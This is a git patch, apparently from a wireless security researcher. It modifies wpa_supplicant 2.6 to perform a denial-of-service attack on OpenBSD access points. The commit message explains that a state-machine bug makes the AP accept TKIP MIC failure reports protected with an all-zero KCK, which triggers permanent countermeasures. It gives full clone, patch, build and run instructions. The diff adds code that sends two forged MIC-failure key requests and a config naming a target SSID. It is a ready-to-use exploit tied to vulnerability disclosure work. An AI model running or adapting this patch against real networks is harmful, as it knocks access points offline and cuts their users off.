@@ -1,0 +1,64 @@
+From b3b09d63d4dddcbd6c3b3c0cb8849d32518af9bc Mon Sep 17 00:00:00 2001
+From: Mathy <vanhoefm@users.noreply.github.com>
+Date: Tue, 18 Jul 2017 07:43:47 -0500
+Subject: [PATCH] Perform OpenBSD TKIP DoS by exploiting all-zero KCK
+
+This patch sends two TKIP MIC failure reports to the AP, protected using
+an all-zero KCK, right after receiving message 1 from the AP. Due to a
+state machine bug, the OpenBSD AP will accept these TKIP MIC failure
+reports. As a result, the AP will activate the TKIP countermeasures. Due
+to a bug in OpenBSD, this will cause a permanent denial-of-service
+attack.
+
+1. Compile a patched wpa_supplicant
+
+git clone git://w1.fi/srv/git/hostap.git -b hostap_2_6 openbsd-dos
+cd openbsd-dos
+patch -p1 < attack_ap_dos.patch
+cd wpa_supplicant
+cp defconfig .config
+make -j 8
+
+2. Then edit network.conf so it contains the target SSID and run
+
+sudo ./wpa_supplicant -D nl80211 -i $INTERFACE -c network.conf
+---
+ src/rsn_supp/wpa.c          |    8 ++++++++
+ wpa_supplicant/network.conf |    6 ++++++
+ 2 files changed, 14 insertions(+)
+ create mode 100644 wpa_supplicant/network.conf
+
+diff --git a/src/rsn_supp/wpa.c b/src/rsn_supp/wpa.c
+index 3c47879..731990a 100644
+--- a/src/rsn_supp/wpa.c
++++ b/src/rsn_supp/wpa.c
+@@ -463,6 +463,14 @@ static void wpa_supplicant_process_1_of_4(struct wpa_sm *sm,
+ 	wpa_dbg(sm->ctx->msg_ctx, MSG_DEBUG, "WPA: RX message 1 of 4-Way "
+ 		"Handshake from " MACSTR " (ver=%d)", MAC2STR(src_addr), ver);
+ 
++	// Instantly send two EAPOL-Key request indicating a MIC failure, encrypted using all-zero KCK
++	printf(">> %s: sending two MIC failure reports using all-zero KCK\n", __FUNCTION__);
++	sm->ptk_set = 1;
++	wpa_sm_key_request(sm, 1, 1);
++	wpa_sm_key_request(sm, 1, 1);
++
++	exit(1);
++
+ 	os_memset(&ie, 0, sizeof(ie));
+ 
+ 	if (sm->proto == WPA_PROTO_RSN || sm->proto == WPA_PROTO_OSEN) {
+diff --git a/wpa_supplicant/network.conf b/wpa_supplicant/network.conf
+new file mode 100644
+index 0000000..13f68a4
+--- /dev/null
++++ b/wpa_supplicant/network.conf
+@@ -0,0 +1,6 @@
++network={
++	ssid="OpenBSDWiFi"
++	psk="unknown_pass"
++
++	pairwise=TKIP
++}
+-- 
+1.7.10.4
+
